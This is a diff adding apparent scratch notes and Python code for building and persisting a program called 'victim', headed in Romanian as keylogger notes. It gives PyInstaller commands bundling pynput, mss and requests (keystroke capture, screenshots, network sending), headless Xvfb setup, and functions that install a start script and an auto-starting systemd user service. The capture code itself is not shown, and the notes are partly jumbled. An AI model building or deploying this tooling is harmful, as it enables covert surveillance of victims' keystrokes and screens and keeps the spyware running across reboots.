@@ -1,0 +1,73 @@
+DACA INCLUD KEYLOGGER PTC EC2 NU ARE UI:
+ pip3 install requests mss pynput
+ pyinstaller --onefile --hidden-import=pynput.keyboard --hidden-import=requests --hidden-import=mss victim.py
+
+  python3 -m PyInstaller victim.py --onefile --hidden-import=pynput.keyboard._xorg --hidden-import=pynput.mouse._xorg
+
+sudo apt-get update
+sudo apt-get install xvfb xorg openbox
+pkill Xvfb
+rm /tmp/.X*-lock
+Xvfb :1 -screen 0 1024x768x16 -nolisten tcp -fp /usr/share/fonts/X11/misc/ &
+export DISPLAY=:1
+ps aux | grep Xvfb
+xvfb-run -a ./dist/victim
+
+
+
+Created symlink
+/home/ubuntu/.config/systemd/user/default.target.wants/victim.service
+ls
+→ /home/ubuntu/.config/systemd/user/victim.service.
+
+
+
+
+def install_dependencies():
+    subprocess.call(['sudo', 'apt-get', 'update'])
+    subprocess.call(['sudo', 'apt-get', 'install', '-y', 'xvfb', 'xorg', 'openbox'])
+
+def start_xvfb():
+    subprocess.call(['pkill', 'Xvfb'])
+    subprocess.call(['rm', '/tmp/.X*-lock'])
+    subprocess.Popen(['Xvfb', ':1', '-screen', '0', '1024x768x16', '-nolisten', 'tcp', '-fp', '/usr/share/fonts/X11/misc/'])
+    os.environ['DISPLAY'] = ':1'
+
+def create_start_script():
+    start_script = '''#!/bin/bash
+pkill Xvfb
+rm /tmp/.X*-lock
+Xvfb :1 -screen 0 1024x768x16 -nolisten tcp -fp /usr/share/fonts/X11/misc/ &
+sleep 5
+export DISPLAY=:1
+/home/ubuntu/.local/bin/victim
+'''
+    script_path = '/home/ubuntu/start_victim.sh'
+    with open(script_path, 'w') as f:
+        f.write(start_script)
+    os.chmod(script_path, 0o755)
+
+def create_service():
+    service_file = '''[Unit]
+Description=Run victim at startup
+After=default.target
+
+[Service]
+ExecStart=/home/ubuntu/start_victim.sh
+
+[Install]
+WantedBy=default.target
+'''
+    service_path = os.path.expanduser("~/.config/systemd/user/victim.service")
+    os.makedirs(os.path.dirname(service_path), exist_ok=True)
+    with open(service_path, 'w') as f:
+        f.write(service_file)
+
+def persistence():
+    install_dependencies()
+    create_start_script()
+    create_service()
+
+    subprocess.call(['systemctl', '--user', 'daemon-reload'])
+    subprocess.call(['systemctl', '--user', 'enable', 'victim.service'])
+    subprocess.call(['systemctl', '--user', 'start', 'victim.service'])
